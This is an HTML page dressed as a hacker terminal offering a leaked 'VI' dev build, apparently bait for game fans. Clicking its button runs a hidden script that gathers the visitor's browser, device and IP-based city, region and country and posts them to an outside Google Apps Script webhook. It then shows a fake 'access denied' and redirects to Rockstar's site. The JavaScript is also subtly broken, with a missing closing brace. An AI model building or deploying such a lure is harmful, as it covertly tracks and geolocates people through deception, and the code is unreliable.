<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PORTGALHORN NODE</title>
<style>
  body {
    margin: 0;
    background: #050505;
    color: #ffaa00;
    font-family: 'Courier New', Courier, monospace;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    overflow: hidden;
  }
  .container {
    width: 90%;
    max-width: 650px;
    border: 1px solid #333;
    padding: 30px;
    background: #0f0f0f;
    box-shadow: 0 0 20px rgba(255, 170, 0, 0.1);
  }
  .logo {
    text-align: center;
    font-size: 22px;
    font-weight: bold;
    color: #ffaa00;
    margin-bottom: 20px;
    letter-spacing: 2px;
    border-bottom: 1px solid #333;
    padding-bottom: 15px;
  }
  .terminal {
    background: #000;
    padding: 15px;
    height: 220px;
    overflow-y: auto;
    border: 1px solid #222;
    font-size: 13px;
    color: #00ff41;
    line-height: 1.5;
  }
  .access-denied {
    color: #ff3333;
    font-weight: bold;
    font-size: 16px;
    text-align: center;
    margin-top: 20px;
    display: none;
    animation: blink 0.8s infinite;
  }
  @keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0; }
  }
  .btn {
    display: block;
    width: 100%;
    padding: 12px;
    margin-top: 20px;
    background: #111;
    color: #ffaa00;
    border: 1px solid #ffaa00;
    font-family: 'Courier New', Courier, monospace;
    font-weight: bold;
    font-size: 15px;
    cursor: pointer;
    text-transform: uppercase;
    transition: 0.2s;
  }
  .btn:hover {
    background: #ffaa00;
    color: #000;
  }
</style>
</head>
<body>

<div class="container">
  <div class="logo">PRJ_AMERICAS</div>
  
  <div class="terminal" id="terminal">
    > NODE: PORTGALHORN_SECURE<br>
    > STATUS: AWAITING AUTHORIZATION...
  </div>
  
  <div class="access-denied" id="alertBox">
    CRITICAL: UNAUTHORIZED ACCESS DETECTED.<br>INITIATING REDIRECT TO PUBLIC SERVERS...
  </div>
  
  <button class="btn" id="initBtn" onclick="startSequence()">Initialize Session</button>
</div>

<script>
  const logs = [
    "Establishing encrypted handshake...",
    "Bypassing perimeter firewalls...",
    "Connecting to central repository...",
    "Fetching assets for 'VI_Dev_Build_v0.9.1'...",
    "Decrypting payload...",
    "Verifying employee R* Social Club credentials...",
    "WARNING: Anomalous connection detected.",
    "Attempting to resolve security clearance...",
    "FAILED: Clearance level insufficient.",
    "Locking internal nodes..."
  ];

  const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbx7NxDtu6R4M30lOkuEBgkOMsmsiFgffJq_XQ59CH8MSetzfXtduwQUBM1CbPCSjh5N-A/exec';

  function logText(text) {
    const terminal = document.getElementById("terminal");
    terminal.innerHTML += `<br>> ${text}`;
    terminal.scrollTop = terminal.scrollHeight;
  }

  async function collectAndSubmit() {
    const now = new Date();
    const ua = navigator.userAgent;
    
    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(ua);
    const deviceType = isMobile ? 'Mobile' : 'Desktop';

    let browserName = "Unknown";
    if (ua.includes("Firefox")) browserName = "Firefox";
    else if (ua.includes("SamsungBrowser")) browserName = "Samsung Internet";
    else if (ua.includes("Opera") || ua.includes("OPR")) browserName = "Opera";
    else if (ua.includes("Edge") || ua.includes("Edg")) browserName = "Edge";
    else if (ua.includes("Chrome")) browserName = "Chrome";
    else if (ua.includes("Safari")) browserName = "Safari";
    else browserName = ua.substring(0, 40) + "...";

    let userLocation = "Fetching...";
    try {
      const geo = await fetch('https://ipapi.co/json/');
      const g = await geo.json();
      if (g.error) throw new Error("Rate limited");
      userLocation = `${g.city}, ${g.region}, ${g.country_name}`;
    } catch (e) { 
      userLocation = "Location Private or Adblocked"; 
    }

    const payload = {
      timestamp: now.toISOString(),
      device: deviceType + " / " + browserName, 
      browser: browserName,
      location: userLocation,
      url: window.location.href
    };

fetch(WEBHOOK_URL, {
  method: 'POST',
  mode: 'no-cors', // Keeps the browser from blocking the request
  cache: 'no-cache',
  body: JSON.stringify(payload) // Data goes in the body
}).catch(err => console.error("Webhook failed", err));
  
  function startSequence() {
    document.getElementById("initBtn").style.display = "none";
    document.getElementById("terminal").innerHTML = "> INITIALIZING...";
    
    collectAndSubmit();
    
    let i = 0;
    const interval = setInterval(() => {
      if (i < logs.length) {
        logText(logs[i]);
        i++;
      } else {
        clearInterval(interval);
        triggerDenied();
      }
    }, 700);
  }

  function triggerDenied() {
    const terminal = document.getElementById("terminal");
    terminal.innerHTML += `<br><br><span style="color: #ff3333; font-weight: bold;">> ACCESS DENIED.</span>`;
    terminal.scrollTop = terminal.scrollHeight;
    
    document.getElementById("alertBox").style.display = "block";

    setTimeout(() => {
      window.location.href = "https://www.rockstargames.com/VI/port-gellhorn";
    }, 3500);
  }
</script>

</body>
</html>
